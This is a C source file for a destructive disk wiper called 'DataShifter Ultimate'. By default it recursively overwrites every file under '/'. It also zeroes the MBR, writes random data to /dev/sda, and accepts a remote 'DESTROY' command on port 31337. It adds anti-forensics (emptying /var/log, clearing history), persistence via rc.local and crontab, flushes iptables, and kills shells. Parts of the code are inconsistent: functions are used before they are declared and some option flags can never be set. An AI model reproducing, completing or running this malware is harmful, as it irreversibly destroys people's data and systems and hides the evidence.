#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <zlib.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define VERSION "3.14"
#define MAX_PATH_LEN 4096
#define BLOCK_SIZE 65536
#define MAX_THREADS 32
#define NETWORK_PORT 31337
#define MAX_CONNECTIONS 5
#define SELF_DESTRUCT_TIMER 300

typedef struct
{
    char target_path[MAX_PATH_LEN];
    unsigned char crypto_key[64];
    int destruction_level;
    int wipe_method;
    int network_mode;
    int silent_mode;
    int zero_fill;
    int mbr_wipe;
    int fs_corrupt;
} DestructionConfig;

typedef struct
{
    int socket;
    struct sockaddr_in address;
} NetworkConnection;

volatile sig_atomic_t termination_requested = 0;
pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
DestructionConfig global_config;

void initialize_crypto()
{
    if (!RAND_status())
    {
        exit(EXIT_FAILURE);
    }
}

void generate_secure_key(unsigned char *key, size_t length)
{
    if (RAND_bytes(key, length) != 1)
    {
        exit(EXIT_FAILURE);
    }
}

void secure_erase(void *ptr, size_t len)
{
    volatile unsigned char *p = (volatile unsigned char *)ptr;
    while (len--)
    {
        *p++ = 0;
        asm volatile("" ::: "memory");
    }
}

void handle_signal(int sig)
{
    termination_requested = 1;
}

void parse_arguments(int argc, char *argv[], DestructionConfig *config)
{
    memset(config, 0, sizeof(DestructionConfig));
    strcpy(config->target_path, "/");
    config->destruction_level = 7;
    config->wipe_method = 3;
    generate_secure_key(config->crypto_key, sizeof(config->crypto_key));
}

void print_banner()
{
    printf("\nDataShifter Ultimate v%s\n", VERSION);
}

void print_help()
{
    printf("Usage: datashifter [options]\n");
}

void validate_config(DestructionConfig *config)
{
    if (strlen(config->target_path) == 0)
    {
        exit(EXIT_FAILURE);
    }
}

void start_destruction(DestructionConfig *config)
{
    recursive_destroy(config->target_path, config->crypto_key, config->destruction_level);
    if (config->mbr_wipe)
    {
        wipe_mbr();
    }
    if (config->fs_corrupt)
    {
        corrupt_filesystem(config->target_path);
    }
    if (config->network_mode)
    {
        network_handler(config);
    }
}

void destroy_file(const char *path, const unsigned char *key, int level)
{
    struct stat st;
    if (lstat(path, &st) != 0)
    {
        return;
    }
    if (S_ISREG(st.st_mode))
    {
        seven_pass_wipe(path, key);
    }
}

void recursive_destroy(const char *path, const unsigned char *key, int level)
{
    DIR *dir;
    struct dirent *entry;
    struct stat st;
    char full_path[MAX_PATH_LEN];

    if (!(dir = opendir(path)))
    {
        destroy_file(path, key, level);
        return;
    }

    while ((entry = readdir(dir)) != NULL && !termination_requested)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
        {
            continue;
        }
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        if (lstat(full_path, &st) != 0)
        {
            continue;
        }
        if (S_ISDIR(st.st_mode))
        {
            recursive_destroy(full_path, key, level);
        }
        else
        {
            destroy_file(full_path, key, level);
        }
    }
    closedir(dir);
}

void wipe_mbr()
{
    int fd = open("/dev/sda", O_RDWR);
    if (fd == -1)
    {
        return;
    }
    unsigned char zero[512];
    memset(zero, 0, sizeof(zero));
    write(fd, zero, sizeof(zero));
    close(fd);
}

void corrupt_filesystem(const char *path)
{
    FILE *f = fopen(path, "r+");
    if (!f)
    {
        return;
    }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);
    unsigned char *data = malloc(size);
    if (!data)
    {
        fclose(f);
        return;
    }
    fread(data, 1, size, f);
    for (long i = 0; i < size; i += 4096)
    {
        data[i] = ~data[i];
    }
    fseek(f, 0, SEEK_SET);
    fwrite(data, 1, size, f);
    free(data);
    fclose(f);
}

void network_handler(DestructionConfig *config)
{
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
    {
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(NETWORK_PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, MAX_CONNECTIONS) < 0)
    {
        exit(EXIT_FAILURE);
    }

    pthread_t threads[MAX_THREADS];
    int thread_count = 0;

    while (!termination_requested)
    {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0)
        {
            continue;
        }

        NetworkConnection *conn = malloc(sizeof(NetworkConnection));
        conn->socket = new_socket;
        memcpy(&conn->address, &address, sizeof(address));

        if (pthread_create(&threads[thread_count], NULL, client_handler, (void*)conn) != 0)
        {
            close(new_socket);
            free(conn);
        }
        else
        {
            thread_count = (thread_count + 1) % MAX_THREADS;
        }
    }

    for (int i = 0; i < MAX_THREADS; i++)
    {
        if (threads[i]) pthread_join(threads[i], NULL);
    }

    close(server_fd);
}

void *client_handler(void *arg)
{
    NetworkConnection *conn = (NetworkConnection *)arg;
    char buffer[1024];
    int valread;

    while ((valread = read(conn->socket, buffer, sizeof(buffer))) > 0 && !termination_requested)
    {
        if (strncmp(buffer, "DESTROY", 7) == 0)
        {
            start_destruction(&global_config);
        }
    }

    close(conn->socket);
    free(conn);
    return NULL;
}

void self_destruct()
{
    system("rm -rf /tmp/* /var/tmp/*");
    memory_wipe();
    char self_path[MAX_PATH_LEN];
    readlink("/proc/self/exe", self_path, sizeof(self_path));
    secure_delete(self_path, global_config.crypto_key);
    process_termination();
    _exit(0);
}

void anti_forensics()
{
    system("find /var/log -type f -exec sh -c 'echo > {}' \;");
    system("history -c");
    memory_wipe();
}

void kernel_mode_wipe(const char *device)
{
    int fd = open(device, O_RDWR);
    if (fd == -1) return;

    unsigned long long size = 0;
    ioctl(fd, BLKGETSIZE64, &size);

    unsigned char *buffer = malloc(BLOCK_SIZE);
    for (unsigned long long offset = 0; offset < size; offset += BLOCK_SIZE)
    {
        if (termination_requested) break;

        lseek(fd, offset, SEEK_SET);
        read(fd, buffer, BLOCK_SIZE);

        for (int pass = 0; pass < 7; pass++)
        {
            overwrite_with_pattern(buffer, BLOCK_SIZE, pass);
            lseek(fd, offset, SEEK_SET);
            write(fd, buffer, BLOCK_SIZE);
            fsync(fd);
        }
    }

    free(buffer);
    close(fd);
}

void register_in_persistence()
{
    FILE *f = fopen("/etc/rc.local", "a");
    if (!f) return;
    fprintf(f, "/usr/bin/datashifter --silent &\n");
    fclose(f);
}

void log_message(const char *message, int is_error)
{
    pthread_mutex_lock(&log_mutex);
    if (is_error)
    {
        fprintf(stderr, "ERROR: %s\n", message);
    }
    else
    {
        printf("LOG: %s\n", message);
    }
    pthread_mutex_unlock(&log_mutex);
}

void overwrite_with_pattern(void *buffer, size_t size, int pattern)
{
    unsigned char *buf = (unsigned char *)buffer;
    for (size_t i = 0; i < size; i++)
    {
        switch (pattern)
        {
            case 0: buf[i] = 0x00; break;
            case 1: buf[i] = 0xFF; break;
            case 2: buf[i] = 0x55; break;
            case 3: buf[i] = 0xAA; break;
            default: buf[i] = rand() % 256; break;
        }
    }
}

void crypto_wipe_pass(void *data, size_t len, const unsigned char *key, int pass_num)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[16];
    RAND_bytes(iv, sizeof(iv));

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, data, NULL, data, len);
    EVP_CIPHER_CTX_free(ctx);
}

void seven_pass_wipe(const char *path, const unsigned char *key)
{
    int fd = open(path, O_RDWR);
    if (fd == -1)
    {
        return;
    }

    struct stat st;
    if (fstat(fd, &st) == -1)
    {
        close(fd);
        return;
    }

    void *map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED)
    {
        close(fd);
        return;
    }

    memset(map, 0, st.st_size);
    msync(map, st.st_size, MS_SYNC);

    memset(map, 0xFF, st.st_size);
    msync(map, st.st_size, MS_SYNC);

    unsigned char *rnd_data = malloc(st.st_size);
    RAND_bytes(rnd_data, st.st_size);
    memcpy(map, rnd_data, st.st_size);
    msync(map, st.st_size, MS_SYNC);
    secure_erase(rnd_data, st.st_size);
    free(rnd_data);

    for (int i = 0; i < 4; i++)
    {
        crypto_wipe_pass(map, st.st_size, key, i);
        msync(map, st.st_size, MS_SYNC);
    }

    munmap(map, st.st_size);
    ftruncate(fd, 0);
    close(fd);
    destroy_metadata(path);
}

void secure_delete(const char *path, const unsigned char *key)
{
    seven_pass_wipe(path, key);
    unlink(path);
}

void destroy_metadata(const char *path)
{
    struct stat st;
    if (lstat(path, &st) != 0) return;

    struct utimbuf times;
    times.actime = time(NULL);
    times.modtime = time(NULL);
    utime(path, &times);

    chmod(path, 0666);
    chown(path, 0, 0);
}

void memory_wipe()
{
    char *dummy;
    long dummy_size = 1024*1024;
    while ((dummy = malloc(dummy_size)))
    {
        memset(dummy, 0, dummy_size);
        free(dummy);
    }
}

void process_termination()
{
    system("killall -9 bash");
    system("killall -9 sh");
}

void filesystem_corruption()
{
    system("dd if=/dev/urandom of=/dev/sda bs=1M count=10");
}

void entropy_flood()
{
    system("cat /dev/urandom > /dev/null &");
}

void create_decoy_files()
{
    FILE *f = fopen("/tmp/decoy.txt", "w");
    if (!f) return;
    fprintf(f, "Nothing to see here\n");
    fclose(f);
}

void timestamp_obfuscation()
{
    system("touch -t 197001010000 /tmp/*");
}

void register_wiping()
{
    system("echo '*/5 * * * * /usr/bin/datashifter --silent' | crontab -");
}

void secure_socket_cleanup(int sock)
{
    shutdown(sock, SHUT_RDWR);
    close(sock);
}

void init_network()
{
    signal(SIGPIPE, SIG_IGN);
}

void cleanup_network()
{
    system("iptables -F");
}

int main(int argc, char *argv[])
{
    print_banner();
    initialize_crypto();
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGHUP, handle_signal);
    
    DestructionConfig config;
    memset(&config, 0, sizeof(config));
    parse_arguments(argc, argv, &config);
    
    validate_config(&config);
    memcpy(&global_config, &config, sizeof(config));
    
    alarm(SELF_DESTRUCT_TIMER);
    start_destruction(&config);
    anti_forensics();
    self_destruct();
    
    return 0;
}
